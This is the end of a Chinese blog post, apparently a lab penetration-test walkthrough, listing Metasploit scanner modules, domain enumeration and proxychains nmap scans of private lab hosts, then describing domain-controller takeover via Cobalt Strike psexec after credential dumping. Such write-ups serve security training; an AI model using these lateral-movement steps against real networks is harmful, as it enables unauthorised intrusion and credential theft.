+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口</span><br><span class="line">auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口</span><br><span class="line">auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口</span><br><span class="line">auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口</span><br><span class="line">auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口</span><br><span class="line">auxiliary/scanner/http/title                 #探测内网http服务的标题</span><br><span class="line">auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   </span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口</span><br><span class="line">auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 </span><br><span class="line">auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口</span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口</span><br><span class="line">auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口</span><br><span class="line">auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口</span><br><span class="line">auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字</span><br></pre></td></tr></table></figure>
+
+<p>查看域信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5130.png" alt="img"></p>
+<p>查看主域信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5131.png" alt="img"></p>
+<h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5132.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<p>这之后尝试了永恒之蓝，但并未成功拿下shell</p>
+<h5 id="psexec攻击直接拿下域控"><a href="#psexec攻击直接拿下域控" class="headerlink" title="psexec攻击直接拿下域控"></a>psexec攻击直接拿下域控</h5><p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5133.png" alt="img"></p>
+<p>点击抓取明文密码，然后点击这里</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5134.png" alt="img"></p>
+<p>右键我们要拿下的域控主机</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5135.png" alt="img"></p>
+<p>选择psexec，进行如下配置</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5136.png" alt="img"></p>
+<p>监听器选择的是<code>Beacon SMB</code></p>
+<p>最后即可顺利拿下域控</p>
+<p><img src="https://ilikeoyt.github.io/image/%E7%BA%A2%E6%97%A5137.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/"> spring内存马</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/15/jackson%E2%80%94CVE-2020-24616/">jackson—CVE-2020-24616 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/09/Log4j-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E2%80%94CVE-2017-5645/" rel="prev" title="Log4j 反序列化分析—CVE-2017-5645">
+      <i class="fa fa-chevron-left"></i> Log4j 反序列化分析—CVE-2017-5645
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/15/jackson%E2%80%94CVE-2020-24616/" rel="next" title="jackson—CVE-2020-24616">
+      jackson—CVE-2020-24616 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">信息搜集+外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.0.1.</span> <span class="nav-text">getshell的另一种姿势</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%BF%E4%B8%8Bshell%E5%90%8E%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">拿下shell后信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="nav-number">2.0.1.</span> <span class="nav-text">是否存在域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%83%85%E5%86%B5-%E8%BF%9B%E7%A8%8B-%E6%9D%80%E8%BD%AF-%E6%9C%8D%E5%8A%A1-%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E5%87%BA%E7%BD%91-%E7%94%A8%E6%88%B7%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5"><span class="nav-number">2.0.2.</span> <span class="nav-text">网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BF%BB%E6%96%87%E4%BB%B6-txt-%E7%B1%BB%E5%9E%8B%E7%9A%84-%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E5%AF%86%E7%A0%81"><span class="nav-number">2.0.3.</span> <span class="nav-text">翻文件 txt 类型的 看是否有密码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Emsf"><span class="nav-number">3.0.1.</span> <span class="nav-text">基于msf</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.0.1.1.</span> <span class="nav-text">上线后的信息搜集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.0.1.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="nav-number">3.0.1.3.</span> <span class="nav-text">抓取域用户的密码信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.0.1.4.</span> <span class="nav-text">远程连接</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ecs"><span class="nav-number">3.0.2.</span> <span class="nav-text">基于cs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-number">3.0.3.</span> <span class="nav-text">建立反向代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.0.4.</span> <span class="nav-text">内网信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">3.0.5.</span> <span class="nav-text">横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#psexec%E6%94%BB%E5%87%BB%E7%9B%B4%E6%8E%A5%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="nav-number">3.0.5.1.</span> <span class="nav-text">psexec攻击直接拿下域控</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
